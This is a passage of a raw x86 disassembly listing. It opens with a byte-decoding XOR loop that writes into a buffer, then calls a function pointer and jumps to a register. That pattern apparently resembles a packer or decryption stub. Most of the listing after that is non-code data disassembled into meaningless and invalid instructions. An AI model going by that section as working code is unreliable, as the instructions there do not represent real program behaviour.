  44062f:	mov    DWORD PTR ds:0x448d10,ecx
  440635:	xor    edx,ecx
  440637:	mov    DWORD PTR [eax],edx
  440639:	mov    edx,DWORD PTR ds:0x448d20
  44063f:	mov    ecx,DWORD PTR ds:0x4480a8
  440645:	add    edx,0xb6a0
  44064b:	mov    esi,0xa3
  440650:	movzx  eax,BYTE PTR [ecx+0x7]
  440654:	movzx  ebx,WORD PTR [ecx+0x2]
  440658:	movzx  ecx,BYTE PTR [ecx]
  44065b:	shl    eax,0x10
  44065e:	add    eax,ebx
  440660:	shl    eax,0x8
  440663:	add    eax,ecx
  440665:	mov    ds:0x448d10,eax
  44066a:	mov    ecx,0xb710d1ac
  44066f:	sub    ecx,DWORD PTR ds:0x448d1c
  440675:	add    edx,0x8
  440678:	xor    ecx,eax
  44067a:	mov    DWORD PTR [edx-0x8],ecx
  44067d:	mov    ecx,DWORD PTR ds:0x4480a8
  440683:	add    ecx,0x8
  440686:	mov    DWORD PTR ds:0x4480a8,ecx
  44068c:	movzx  eax,BYTE PTR [ecx+0x7]
  440690:	movzx  ebx,WORD PTR [ecx+0x2]
  440694:	movzx  ecx,BYTE PTR [ecx]
  440697:	shl    eax,0x10
  44069a:	add    eax,ebx
  44069c:	shl    eax,0x8
  44069f:	add    eax,ecx
  4406a1:	mov    ecx,0xb710d1ac
  4406a6:	sub    ecx,DWORD PTR ds:0x448d1c
  4406ac:	mov    ds:0x448d10,eax
  4406b1:	xor    ecx,eax
  4406b3:	mov    DWORD PTR [edx-0x4],ecx
  4406b6:	mov    ecx,DWORD PTR ds:0x4480a8
  4406bc:	add    ecx,0x8
  4406bf:	dec    esi
  4406c0:	mov    DWORD PTR ds:0x4480a8,ecx
  4406c6:	jne    0x440650
  4406c8:	test   edi,edi
  4406ca:	je     0x4406d3
  4406cc:	push   edi
  4406cd:	call   DWORD PTR ds:0x44502c
  4406d3:	pop    edi
  4406d4:	pop    esi
  4406d5:	pop    ebx
  4406d6:	ret    
  4406d7:	int3   
  4406d8:	int3   
  4406d9:	int3   
  4406da:	int3   
  4406db:	int3   
  4406dc:	int3   
  4406dd:	int3   
  4406de:	int3   
  4406df:	int3   
  4406e0:	jmp    esi
  4406e2:	int3   
  4406e3:	adc    BYTE PTR [edi],dl
  4406e5:	add    BYTE PTR [edx-0x3e950001],ah
  4406eb:	inc    DWORD PTR [eax]
  4406ed:	jmp    0x5b43c6f2
  4406f2:	dec    ebp
  4406f4:	mov    esp,0xffffa083
  4406f9:	dec    ebx
  4406fa:	pop    eax
  4406fb:	inc    DWORD PTR [eax]
  4406fd:	jb     0x4406ff
  4406ff:	add    BYTE PTR [ebx+0x3b654dff],0x89
  440706:	cmp    BYTE PTR [ecx+0x5f81df00],cl
  44070c:	add    DWORD PTR [esi-0x1],0xffffffff
  440710:	inc    DWORD PTR [ebx-0x23c2f6]
  440716:	mov    esp,0x66140000
  44071b:	mov    ecx,0x89a789
  440720:	add    bh,bh
  440722:	and    al,0x77
  440724:	push   ecx
  440725:	jmp    DWORD PTR [ebx+eax*4+0x1ea24ff]
  44072c:	add    BYTE PTR [edi],bl
  44072e:	inc    DWORD PTR [ebx+0x22df8300]
  440734:	out    dx,al
  440735:	dec    DWORD PTR [eax-0x20fcff01]
  44073b:	(bad)  
  44073c:	jmp    FWORD PTR [ebx+eax*4]
  44073f:	add    DWORD PTR [ebx+0x39154689],0x0
  440746:	sub    edi,edi
  440748:	and    DWORD PTR [ebx+eax*4+0x60],0xffffff89
  44074d:	jmp    0x1bf7:0x8983ffff
  440754:	fcmovne st,st(4)
  440756:	sbb    DWORD PTR [eax],eax
  440758:	call   FWORD PTR ds:0xfa008bd9
  44075e:	(bad)  
  44075f:	(bad)  
  440760:	dec    esp
  440762:	jbe    0x4407a9
  440764:	add    bh,bh
  440766:	xchg   edi,eax
  440767:	add    BYTE PTR [ecx+0x2eca9e],cl
  44076d:	loope  0x44076e
  44076f:	inc    DWORD PTR [eax]
  440771:	adc    DWORD PTR [ebx+0x68],0xffffffbf
  440775:	call   DWORD PTR [eax-0x2cb93301]
  44077b:	adc    bh,bh
  44077d:	pushf  
  44077e:	int3   
  44077f:	(bad)  
  440780:	inc    DWORD PTR [eax]
  440782:	jb     0x440744
  440784:	push   esp
  440785:	add    BYTE PTR [ecx],al
  440787:	add    DWORD PTR [eax],0xffffff90
  44078a:	ja     0x44071c
  44078c:	(bad)  
  44078d:	fiadd  DWORD PTR [eax]
  44078f:	add    ah,cl
  440791:	(bad)  
  440792:	out    dx,eax
  440793:	mul    DWORD PTR [ebx-0x5b01]
  440799:	loopne 0x440766
  44079b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44079c:	push   DWORD PTR [edx+0x0]
  44079f:	add    BYTE PTR [ecx+0x7de939ff],cl
  4407a5:	sub    DWORD PTR [edx+0x3331ff00],0x1b
  4407ac:	push   DWORD PTR [ebx-0x1]
  4407af:	inc    DWORD PTR [eax]
  4407b1:	(bad)  
  4407b2:	cmp    eax,ebp
  4407b4:	mov    ?,edi
  4407b6:	(bad)  
  4407b8:	add    BYTE PTR [ebp+0x2d009ccc],dl
  4407be:	add    bh,bh
  4407c0:	inc    DWORD PTR [eax]
  4407c2:	mov    eax,ds:0x1cc3397
  4407c7:	(bad)  
  4407c8:	dec    DWORD PTR [ebp-0x33ffa2f5]
  4407ce:	or     DWORD PTR [ecx-0x30b8ff01],0xffffffe9
  4407d5:	add    BYTE PTR [edi+0x0],cl
  4407d8:	add    BYTE PTR [esi+edi*2],al
  4407db:	ja     0x4407dc
  4407dd:	jmp    0x448be1
  4407e2:	shl    DWORD PTR [edx],cl
  4407e4:	call   0xff44c3e8
  4407e9:	push   esp
  4407ea:	aam    0xef
  4407ec:	dec    ecx
  4407ee:	(bad)  
  4407ef:	(bad)  
  4407f0:	(bad)  
  4407f1:	jmp    edx
  4407f3:	mov    ebx,0xff2c00b1
  4407f8:	add    BYTE PTR [ebp+0x63],al
  4407fb:	push   cs
  4407fc:	dec    DWORD PTR [edx-0x1000000]
  440802:	scas   al,BYTE PTR es:[edi]
  440803:	and    ah,BYTE PTR [esp+ecx*8-0x2a]
  440807:	dec    DWORD PTR [ecx-0x7c9f7b35]
  44080d:	std    
  44080e:	mov    DWORD PTR [ebx-0xeeb0100],eax
  440814:	add    BYTE PTR [eax],0xf4
  440817:	inc    DWORD PTR [eax]
  440819:	xchg   ebx,eax
  44081a:	mov    al,BYTE PTR [edi]
  44081c:	jmp    DWORD PTR [edi+edi*8-0x34ffff77]
  440823:	call   0x12991b8
  440828:	and    esp,0xffffffb0
  44082b:	sub    bh,bh
  44082d:	fadd   DWORD PTR [eax]
  44082f:	(bad)  
  440830:	(bad)  
  440831:	call   FWORD PTR [esp+esi*1+0xee8987]
  440838:	jmp    FWORD PTR [edx+0x62]
  44083b:	jle    0x4407c0
  44083d:	add    eax,DWORD PTR [eax]
  44083f:	mov    edi,edi
  440841:	push   DWORD PTR [eax-0x300094c2]
  440847:	cmp    edi,0x38
  44084a:	in     eax,dx
  44084b:	cmc    
  44084c:	mov    edi,ebp
  44084e:	add    BYTE PTR [eax],al
  440850:	int3   
  440851:	dec    DWORD PTR [ebp-0x68000c73]
  440857:	add    DWORD PTR [eax],0x33
  44085a:	shl    BYTE PTR [edi+0x89cc89],1
  440860:	inc    DWORD PTR [eax]
  440862:	add    BYTE PTR [ebx-0x760e009a],0xff
  440869:	aam    0xb0
  44086b:	push   DWORD PTR cs:[ecx+0xccccff]
  440872:	test   eax,0x7800fe37
  440877:	add    BYTE PTR [ecx+0x6d0736],cl
  44087d:	stos   DWORD PTR es:[edi],eax
  44087e:	add    bh,bh
  440880:	(bad)  
  440881:	push   DWORD PTR [esp+esi*1+0x6c]
  440885:	add    BYTE PTR [ebx-0x1],ah
  440888:	add    BYTE PTR [ecx+0x25fff5bb],al
  44088e:	add    DWORD PTR [ebx+0x6bafffff],0xffffffc9
  440895:	jmp    DWORD PTR [ecx+0x6f24ff00]
  44089b:	xlat   BYTE PTR ds:[ebx]
  44089c:	call   FWORD PTR [esi]
  44089e:	add    BYTE PTR [eax],al
  4408a0:	add    DWORD PTR [eax],0xffffffa6
  4408a3:	add    DWORD PTR [eax-0x34],esi
  4408a6:	cmp    edi,0xc83181ff
  4408ac:	add    DWORD PTR [ebx-0x34],0xffffffff
  4408b0:	(bad)  
  4408b1:	jmp    esp
  4408b3:	fs (bad) 
  4408b6:	repz int3 
  4408b8:	call   DWORD PTR [esp+esi*1-0x48]
  4408bc:	add    BYTE PTR ds:0xffffff00,dl
  4408c2:	pop    ss
  4408c3:	mov    al,0x16
  4408c5:	(bad)  
  4408c6:	std    
  4408c7:	add    BYTE PTR [eax],al
  4408c9:	aas    
  4408ca:	jbe    0x4408db
  4408cc:	mov    DWORD PTR [edi+0x0],ebp
  4408cf:	add    bh,bh
  4408d1:	add    dh,bl
  4408d3:	adc    BYTE PTR [ebp-0x337c1a00],ah
  4408d9:	rol    BYTE PTR [ebp-0x89ffdb],1
  4408df:	add    DWORD PTR [eax],0xffffffff
  4408e2:	in     al,0x6d
  4408e4:	mov    bl,0xcc
  4408e6:	dec    ebp
  4408e7:	(bad)  
  4408e8:	(bad)  
  4408e9:	jg     0x440937
  4408eb:	popf   
  4408ec:	add    al,bh
  4408ee:	add    BYTE PTR [ebx-0x2e010001],al
  4408f4:	cmp    cl,ah
  4408f6:	dec    eax
  4408f7:	add    BYTE PTR [ebx-0xba1728],al
  4408fd:	idiv   edi
  4408ff:	int3   
  440900:	(bad)  
  440901:	jmp    DWORD PTR [esi+0x59003ffe]
  440907:	add    bh,bh
  440909:	push   eax
  44090a:	sbb    dl,BYTE PTR [edi]
  44090c:	mov    DWORD PTR [eax+0x830083],ecx
  440912:	mov    ch,dl
  440914:	adc    al,0xcc
  440916:	aas    
  440917:	int3   
  440918:	push   DWORD PTR [edi]
  44091a:	dec    edx
  44091b:	mov    bh,0x83
  44091d:	pop    ebx
  44091e:	int3   
  44091f:	(bad)  
  440920:	inc    DWORD PTR [eax]
  440922:	cmp    DWORD PTR [esi+0x54ffbe],edi
  440928:	sbb    DWORD PTR [esi+0xbff4b7c],0xffffffff
  44092f:	(bad)  
  440930:	dec    esp
  440932:	icebp  
  440933:	sub    BYTE PTR [edx+0x0],cl
  440936:	(bad)  
  440937:	(bad)  
  440938:	call   FWORD PTR [ebp+0x5b]
  44093b:	test   esp,0xff0089ce
  440941:	sbb    DWORD PTR [eax],0x6c
  440944:	je     0x440946
  440946:	xchg   ah,cl
  440948:	add    BYTE PTR [esi-0x610040f8],bh
  44094e:	inc    DWORD PTR [eax]
  440950:	add    DWORD PTR [ebx+0xed2006],0xf
  440957:	inc    DWORD PTR [ebx-0x7ce65b9d]
  44095d:	xchg   DWORD PTR [ecx-0x16ffff7d],ecx
  440963:	or     DWORD PTR [ebx],ebx
  440965:	(bad)  
  440966:	cmp    eax,0xf8788383
  44096b:	push   ds
  44096c:	dec    esp
  44096e:	inc    DWORD PTR [eax]
  440970:	mov    DWORD PTR [ebx-0x8d905f],eax
  440976:	aas    
  440977:	int3   
  440978:	call   DWORD PTR [ebp-0x6c7c1980]
  44097e:	mov    DWORD PTR [eax],eax
  440980:	add    bh,bh
  440982:	outs   dx,DWORD PTR ds:[esi]
  440983:	mov    esp,0x830ecc9f
  440988:	jmp    DWORD PTR ds:0x5fffee16
  44098e:	add    BYTE PTR [eax],al
  440990:	or     esp,0xffffff87
  440993:	adc    bl,cl
  440995:	jmp    ebp
  440997:	add    ah,cl
  440999:	cmp    al,0x87
  44099b:	add    edi,edi
  44099d:	in     al,0xff
  44099f:	inc    DWORD PTR [eax]
  4409a1:	add    BYTE PTR ds:0xb2ffecc4,ah
  4409a7:	mov    DWORD PTR [eax],eax
  4409a9:	xchg   esi,eax
  4409aa:	out    dx,eax
  4409ab:	dec    esp
  4409ac:	call   FWORD PTR [ebx+eax*4+0x7e00ffff]
  4409b3:	loopne 0x440953
  4409b5:	add    BYTE PTR [edx],al
  4409b7:	int3   
  4409b8:	add    BYTE PTR [ecx],bh
  4409ba:	int    0x45
  4409bc:	and    DWORD PTR [edi-0x1],0xffffffcc
  4409c0:	int3   
  4409c1:	(bad)  
  4409c2:	clc    
  4409c3:	push   eax
  4409c4:	fs mov eax,ebx
  4409c7:	add    ah,cl
  4409c9:	sub    eax,0xf0005525
  4409ce:	int3   
  4409cf:	(bad)  
  4409d0:	inc    DWORD PTR [eax]
  4409d2:	shl    BYTE PTR [edx],cl
  4409d4:	adc    al,BYTE PTR [ebx-0x70000087]
  4409da:	loop   0x4409b5
  4409dc:	and    DWORD PTR [esi],0x0
  4409df:	cmp    edi,0xffffff83
  4409e2:	cmp    bh,BYTE PTR [ebx-0x4]
  4409e5:	xor    DWORD PTR [edi-0x34],0xffffff89
  4409e9:	std    
  4409ea:	hlt    
  4409eb:	outs   dx,BYTE PTR ds:[esi]
  4409ec:	inc    DWORD PTR [eax]
  4409ee:	add    DWORD PTR [ebx+0x11c3cc83],0xffffff99
  4409f5:	add    ch,ah
  4409f7:	dec    esp
  4409f9:	call   0xed445231
  4409fe:	mov    DWORD PTR [eax],eax
  440a00:	add    bh,bh
  440a02:	icebp  
  440a03:	pop    esi
  440a04:	mov    eax,DWORD PTR [eax]
  440a06:	mov    eax,ds:0xf69cffff
  440a0b:	lods   eax,DWORD PTR ds:[esi]
  440a0c:	xor    esp,0x0
  440a0f:	(bad)  
  440a10:	dec    esp
  440a12:	adc    DWORD PTR [esi+0x80ff1d],ebx
  440a18:	or     DWORD PTR [esi],0x36
  440a1b:	mov    ds:0x83ff6100,al
  440a20:	inc    DWORD PTR [ebx+0x351bea]
  440a26:	jno    0x440a27
  440a28:	dec    DWORD PTR [edi]
  440a2a:	ret    0x81
  440a2d:	mov    cl,0x83
  440a2f:	cmp    edi,0xffffffcc
  440a32:	inc    ebp
  440a33:	and    al,0x3e
  440a35:	jmp    ebx
  440a37:	int3   
  440a38:	inc    DWORD PTR [ebx+0x4c]
  440a3b:	data16 (bad) 
  440a3d:	in     al,dx
  440a3e:	cmp    edi,0xffffffff
  440a41:	call   FWORD PTR [esi-0x39]
  440a44:	in     al,0x0
  440a46:	inc    WORD PTR [eax]
  440a49:	adc    BYTE PTR [ebp+0x1b],dh
  440a4c:	call   DWORD PTR [edx-0x1]
  440a4f:	add    BYTE PTR [eax],al
  440a51:	mov    ebx,edi
  440a53:	inc    edx
  440a54:	cmp    al,BYTE PTR [eax]
  440a56:	push   ebp
  440a57:	inc    DWORD PTR [eax]
  440a59:	push   edx
  440a5a:	adc    ebp,DWORD PTR [eax-0x1]
  440a5d:	fs mov edi,edi
  440a60:	(bad)  
  440a61:	jmp    DWORD PTR [esi*8-0x7c170079]
  440a68:	push   DWORD PTR [ebx-0x1efff012]
  440a6e:	add    bh,bh
  440a70:	dec    DWORD PTR [ecx-0x7ccb2517]
  440a76:	je     0x440a77
  440a78:	(bad)  
  440a79:	out    dx,al
  440a7a:	out    dx,eax
  440a7b:	sar    edi,1
  440a7d:	popf   
  440a7e:	add    BYTE PTR [ebx-0x72577700],al
  440a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440a85:	add    BYTE PTR [eax],bh
  440a87:	inc    DWORD PTR [eax]
  440a89:	cld    
  440a8a:	pusha  
  440a8b:	enter  0xb589,0x0
  440a8f:	add    BYTE PTR [eax],al
  440a91:	inc    DWORD PTR [edi-0x36]
  440a94:	push   ebx
  440a95:	add    BYTE PTR [ebp+0x609dffff],ah
  440a9b:	stos   BYTE PTR es:[edi],al
  440a9c:	or     DWORD PTR [ecx],0x0
  440a9f:	add    bh,bh
  440aa1:	(bad)  
  440aa2:	cmp    DWORD PTR [ecx],eax
  440aa4:	sti    
  440aa5:	add    al,dl
  440aa7:	add    BYTE PTR [eax],al
  440aa9:	sbb    dh,BYTE PTR [edi+ecx*1+0x0]
  440aad:	arpl   di,di
  440aaf:	inc    DWORD PTR [eax]
  440ab1:	push   DWORD PTR [ebx-0x3f]
  440ab4:	pop    ss
  440ab5:	and    DWORD PTR [ebp-0x700d0100],0x61
  440abc:	int3   
  440abd:	lods   eax,DWORD PTR ds:[esi]
  440abe:	int3   
  440abf:	add    DWORD PTR [eax],0xffffffff
  440ac2:	test   eax,0xbcff804e
  440ac7:	mov    DWORD PTR [eax],eax
  440ac9:	xchg   edx,eax
  440aca:	adc    ecx,DWORD PTR [ebx-0x1]
  440acd:	cli    
  440ace:	inc    DWORD PTR [eax]
  440ad0:	mov    DWORD PTR [ebx+0x1ba91c],eax
  440ad6:	jle    0x440ad7
  440ad8:	(bad)  
  440ad9:	cmp    BYTE PTR [eax],dh
  440adb:	lods   eax,DWORD PTR ds:[esi]
  440adc:	inc    DWORD PTR [edi+edi*8-0x66007c01]
  440ae3:	and    DWORD PTR [edi+edi*8+0x7f83ffc4],esi
  440aea:	bound  eax,QWORD PTR [edx]
  440aec:	cmp    edi,0xffffff83
  440aef:	(bad)  
  440af0:	inc    DWORD PTR [eax]
  440af2:	sar    BYTE PTR [esi*8-0x7c004c00],cl
  440af9:	pushf  
  440afa:	cmc    
  440afb:	test   eax,0xff83f1ff
  440b00:	(bad)  
  440b01:	(bad)  
  440b02:	call   0x9b43b4ee
  440b07:	dec    esp
  440b09:	xor    eax,0xe9002c92
  440b0e:	add    BYTE PTR [eax],al
  440b10:	inc    DWORD PTR [eax]
  440b12:	adc    BYTE PTR [ebx-0x14],0x0
  440b16:	bound  ecx,QWORD PTR [ecx+0x16a31bff]
  440b1c:	add    BYTE PTR [ebx-0x1],bh
  440b1f:	inc    DWORD PTR [ebx-0x3e77677]
  440b25:	dec    DWORD PTR [eax+eax*1]
  440b28:	dec    DWORD PTR [eax]
  440b2a:	push   0xff10ffad
  440b2f:	(bad)  
  440b30:	dec    esp
  440b32:	push   edi
  440b33:	mov    eax,0xff3affe6
  440b38:	add    BYTE PTR [ecx-0x35ff4011],bl
  440b3e:	add    bh,bh
  440b40:	inc    DWORD PTR [eax]
  440b42:	out    0x92,eax
  440b44:	rol    BYTE PTR [eax],0xaf
  440b47:	inc    DWORD PTR [eax]
  440b49:	jns    0x440ae7
  440b4b:	(bad)  
  440b4d:	jb     0x440b4e
  440b4f:	add    bh,bh
  440b51:	call   DWORD PTR [ebx+ecx*8]
  440b54:	rol    BYTE PTR [eax],0x3a
  440b57:	inc    DWORD PTR [ebx-0x76de15d2]
  440b5d:	popa   
  440b5e:	add    bh,bh
  440b60:	add    bh,bh
  440b62:	mov    edx,0x31ff478d
  440b67:	mov    DWORD PTR [eax],eax
  440b69:	imul   esi,DWORD PTR [edi-0xa],0xccffec00
  440b70:	(bad)  
  440b71:	push   ebx
  440b73:	xlat   BYTE PTR ds:[ebx]
  440b74:	dec    ecx
  440b75:	add    BYTE PTR [eax-0x1],dl
  440b78:	jmp    DWORD PTR [ecx+0x4900cee7]
  440b7e:	add    ah,cl
  440b80:	add    bh,bh
  440b82:	adc    DWORD PTR [esi-0x7cfc7c8d],ebx
  440b88:	int3   
  440b89:	xor    ebp,DWORD PTR [eax-0x52]
  440b8c:	mov    esp,ebx
  440b8e:	(bad)  
  440b8f:	dec    esp
  440b91:	jmp    FWORD PTR [ebx]
  440b93:	and    al,0xf
  440b95:	int3   
  440b96:	pop    edx
  440b97:	inc    DWORD PTR [eax]
  440b99:	loop   0x440b67
  440b9b:	xchg   edx,eax
  440b9c:	add    BYTE PTR [ecx+0x0],cl
  440b9f:	(bad)  
  440ba0:	inc    DWORD PTR [eax]
  440ba2:	in     al,dx
  440ba3:	adc    ebp,edi
  440ba5:	push   DWORD PTR [ebp-0x34d7337d]
  440bab:	inc    eax
  440bac:	mov    DWORD PTR ds:0x830000ff,edi
  440bb2:	pop    ecx
  440bb3:	aad    0x4e
  440bb5:	int3   
  440bb6:	jle    0x440b3b
  440bb8:	call   FWORD PTR [ecx+0x7f]
  440bbb:	mov    edi,0xffcc8800
  440bc0:	inc    DWORD PTR [eax]
  440bc2:	adc    edi,DWORD PTR [edi-0x7cb30011]
  440bc8:	add    BYTE PTR [eax+0x4e],bh
  440bcb:	mov    edi,0x89ff60ff
  440bd0:	add    DWORD PTR [eax],0xe
  440bd3:	out    0x5b,eax
  440bd5:	add    dh,dl
  440bd7:	(bad)  
  440bd8:	push   ebx
  440bda:	xor    eax,0x837aff5f
  440bdf:	int3   
  440be0:	add    BYTE PTR [eax],al
  440be2:	dec    esi
  440be3:	adc    DWORD PTR [edi],eax
  440be5:	(bad)  
  440be6:	in     al,dx
  440be7:	(bad)  
  440be8:	call   DWORD PTR [esi]
  440bea:	je     0x440c4d
  440bec:	int3   
  440bed:	scas   al,BYTE PTR es:[edi]
  440bee:	add    BYTE PTR [eax],al
  440bf0:	inc    DWORD PTR [eax]
  440bf2:	or     ebp,DWORD PTR [eax-0xac0099]
  440bf8:	adc    DWORD PTR [edx+0x74],0x3b
  440bfc:	add    dl,al
  440bfe:	int3   
  440bff:	cmp    edi,0x0
  440c02:	or     eax,0x7600a08d
  440c07:	(bad)  
  440c08:	dec    edi
  440c0a:	(bad)  
  440c0b:	cmp    al,BYTE PTR [eax]
  440c0d:	or     bh,bh
  440c0f:	add    BYTE PTR [eax],al
  440c11:	call   DWORD PTR [ebp+0x35ff914a]
  440c17:	add    BYTE PTR [ebx-0x9895ac],al
  440c1d:	jmp    0xa6de:0xff00ffff
  440c24:	dec    WORD PTR [ecx-0x1]
  440c28:	(bad)  
  440c29:	fnstcw WORD PTR [eax]
  440c2b:	mov    ebp,0xccff12ff
  440c30:	add    BYTE PTR [eax],al
  440c32:	add    ebx,DWORD PTR [ebx]
  440c34:	jno    0x440c35
  440c36:	cmp    edi,edi
  440c38:	inc    DWORD PTR [edx-0x18ff856d]
  440c3e:	add    bh,bh
  440c40:	dec    esp
  440c42:	xchg   esp,eax
  440c43:	add    edx,ecx
  440c45:	add    dl,al
  440c47:	int3   
  440c48:	int3   
  440c49:	out    0x5e,al
  440c4b:	add    bh,bh
  440c4d:	adc    al,0xcc
  440c4f:	add    BYTE PTR [ecx+0x590c39cc],cl
  440c55:	add    BYTE PTR [ebx+0x0],dh
  440c58:	(bad)  
  440c59:	sti    
  440c5a:	rcr    BYTE PTR [edx],1
  440c5c:	sbb    DWORD PTR ds:0xff0000ff,0xffffffea
  440c63:	int3   
  440c64:	inc    edi
  440c65:	jmp    FWORD PTR [esi-0x1]
  440c68:	push   DWORD PTR [edx-0x2f7606e5]
  440c6e:	cmp    edi,0x0
  440c71:	(bad)  
  440c72:	jge    0x440cc7
  440c74:	sub    DWORD PTR [eax],eax
  440c76:	cdq    
  440c77:	add    bh,bh
  440c79:	fidivr WORD PTR [ebx-0x50]
  440c7c:	add    al,ah
  440c7e:	dec    esp
  440c80:	(bad)  
  440c81:	call   DWORD PTR [esi]
  440c83:	push   ebp
  440c84:	dec    esp
  440c85:	(bad)  
  440c86:	sti    
  440c87:	add    DWORD PTR [eax],0xffffffe3
  440c8a:	bnd ret 
  440c8c:	int3   
  440c8d:	cmp    al,0x83
  440c8f:	mov    DWORD PTR [eax],eax
  440c91:	call   FWORD PTR [eax-0x6]
  440c94:	lock add BYTE PTR [edi-0x1ccb7d00],ch
  440c9b:	adc    bh,bh
  440c9d:	loop   0x440c9e
  440c9f:	mov    DWORD PTR [ecx-0x58600501],ecx
  440ca5:	add    BYTE PTR [edx-0x125bff7d],dh
  440cab:	ds int3 
  440cad:	cdq    
  440cae:	add    ah,cl
  440cb0:	(bad)  
  440cb1:	push   DWORD PTR [ebx+edx*1]
  440cb4:	and    edi,edi
  440cb6:	out    0xff,al
  440cb8:	jmp    DWORD PTR [ebx-0x16]
  440cbb:	(bad)  
  440cbc:	mov    DWORD PTR [esi-0x77],edi
  440cc2:	test   al,0xa1
  440cc4:	lods   al,BYTE PTR ds:[esi]
  440cc5:	int3   
  440cc6:	jp     0x440c4b
  440cc8:	cmp    esi,0xffffffe2
  440ccb:	arpl   di,di
  440ccd:	in     eax,0xff
  440ccf:	inc    DWORD PTR [eax]
  440cd1:	dec    DWORD PTR [edi-0xc]
  440cd4:	je     0x440cd5
  440cd6:	inc    ebp
  440cd7:	add    bh,bh
  440cd9:	data16 add al,0xca
  440cdc:	add    BYTE PTR [edx-0x100],dh
  440ce2:	jb     0x440d57
  440ce4:	sub    edi,edi
  440ce6:	or     BYTE PTR [ecx-0x6cf93d7d],cl
  440cec:	add    cl,bh
  440cee:	(bad)  
  440cef:	inc    DWORD PTR [ebx-0x3b866701]
  440cf5:	cmp    DWORD PTR [esi-0x7d],0xffffffff
  440cf9:	xor    eax,0x3dccda8e
  440cfe:	inc    DWORD PTR [eax]
  440d00:	inc    DWORD PTR [eax]
  440d02:	push   0xffffffd5
  440d04:	cdq    
  440d05:	int3   
  440d06:	and    edi,edi
  440d08:	or     DWORD PTR [esi+0xfff09b0],0x0
  440d0f:	(bad)  
  440d10:	(bad)  
  440d11:	inc    ecx
  440d13:	mov    esp,0xbcffe1
  440d18:	jmp    DWORD PTR [edx-0x6333b6a9]
  440d1e:	(bad)  
  440d1f:	(bad)  
  440d20:	inc    DWORD PTR [ebx+0xec71b]
  440d26:	ret    
  440d27:	(bad)  
  440d28:	call   FWORD PTR [eax]
  440d2a:	jno    0x440d83
  440d2c:	push   esi
  440d2e:	mov    DWORD PTR [eax],eax
  440d30:	inc    DWORD PTR [eax]
  440d32:	pop    ebp
  440d33:	(bad)  
  440d35:	inc    edi
  440d37:	(bad)  
  440d38:	jmp    FWORD PTR [ebx-0x63]
  440d3b:	xlat   BYTE PTR ds:[ebx]
  440d3c:	add    BYTE PTR [esi],al
  440d3e:	inc    DWORD PTR [eax]
  440d40:	(bad)  
  440d41:	(bad)  
  440d42:	mov    esi,0x6eff48b7
  440d47:	cmp    edi,0x53
  440d4a:	or     eax,DWORD PTR ds:0xf0ff
  440d50:	(bad)  
  440d51:	dec    ecx
  440d53:	lods   eax,DWORD PTR ds:[esi]
  440d54:	push   0x3e00
  440d59:	test   DWORD PTR [ecx+0x6f],0xffff5300
  440d60:	add    BYTE PTR [ebx-0x767606e9],al
  440d66:	(bad)  
  440d67:	(bad)  
  440d68:	(bad)  
  440d69:	cmp    dl,bl
  440d6b:	pop    edx
  440d6c:	jmp    FWORD PTR [ecx+0x0]
  440d6f:	int3   
  440d70:	(bad)  
  440d71:	push   DWORD PTR [ebp-0x76005773]
  440d77:	add    bh,bh
  440d79:	in     al,dx
  440d7a:	ins    BYTE PTR es:[edi],dx
  440d7b:	push   esp
  440d7c:	add    BYTE PTR [ebp-0x1],ch
  440d7f:	int3   
  440d80:	add    BYTE PTR [ebx-0xfac164],al
  440d86:	pop    esp
  440d87:	inc    DWORD PTR [eax]
  440d89:	jmp    0x440dae
  440d8b:	and    bh,bh
  440d8d:	sbb    eax,0xffffccff
  440d92:	mov    bl,0x64
  440d94:	ret    
  440d95:	(bad)  
  440d96:	jnp    0x440d97
  440d98:	(bad)  
  440d99:	fstp   QWORD PTR [ebx]
  440d9b:	ins    DWORD PTR es:[edi],dx
  440d9c:	add    BYTE PTR [ecx-0x1],dh
  440d9f:	inc    DWORD PTR [ebx-0x3b5fd101]
  440da5:	mov    DWORD PTR [edi],ecx
  440da7:	inc    DWORD PTR [ebx-0x7cc700d0]
  440dad:	mov    dl,0xff
  440daf:	add    BYTE PTR [eax],al
  440db1:	add    BYTE PTR [ebp+0x21],ah
  440db4:	adc    al,0xff
  440db6:	lahf   
  440db7:	dec    DWORD PTR [ecx-0x333e1148]
  440dbd:	sbb    bh,bh
  440dbf:	(bad)  
  440dc0:	(bad)  
  440dc1:	inc    esi
  440dc3:	mov    ebp,0xcc7d00e2
  440dc8:	(bad)  
  440dc9:	jg     0x440d54
  440dcb:	sahf   
  440dcc:	call   FWORD PTR [eax+eax*1]
  440dcf:	dec    DWORD PTR [ecx-0x778d8001]
  440dd5:	(bad)  
  440dd6:	mov    ebp,0x7df583ff
  440ddb:	add    bh,bh
  440ddd:	int    0x89
  440ddf:	add    BYTE PTR [ebx+0x7cc9dc83],al
  440de5:	jmp    FWORD PTR ds:0xfc1089ff
  440deb:	mov    ecx,0x4bff
  440df0:	inc    DWORD PTR [eax]
  440df2:	xor    BYTE PTR [ecx-0x46],bh
  440df5:	cmp    DWORD PTR [edi+edi*8-0x1],0xffffff93
  440dfa:	(bad)  
  440dfb:	leave  
  440dfc:	add    bh,bh
  440dfe:	add    bh,bh
  440e00:	inc    DWORD PTR [eax]
  440e02:	repz shl BYTE PTR [ecx],0x83
  440e06:	jae    0x440d91
  440e08:	add    BYTE PTR [ebp+0x6c],dl
  440e0b:	or     al,0x0
  440e0d:	inc    esi
  440e0e:	int3   
  440e0f:	(bad)  
  440e10:	inc    DWORD PTR [eax]
  440e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440e13:	pop    eax
  440e14:	add    eax,DWORD PTR [eax]
  440e16:	scas   al,BYTE PTR es:[edi]
  440e17:	add    DWORD PTR [ebx-0x9de30c],0xffffffa3
  440e1e:	(bad)  
  440e1f:	(bad)  
  440e20:	inc    DWORD PTR [ebx-0x781d8e]
  440e26:	inc    DWORD PTR gs:[eax]
  440e29:	out    0x6d,al
  440e2b:	sahf   
  440e2c:	int3   
  440e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440e2e:	inc    DWORD PTR [eax]
  440e30:	(bad)  
  440e31:	dec    DWORD PTR [ecx+0x3aff1284]
  440e37:	add    BYTE PTR [eax],al
  440e39:	test   eax,0xfb007060
  440e3e:	add    bh,bh
  440e40:	add    bh,bh
  440e42:	add    al,0x11
  440e44:	adc    al,0x89
  440e46:	(bad)  
  440e47:	(bad)  
  440e48:	(bad)  
  440e49:	jp     0x440e66
  440e4b:	push   ss
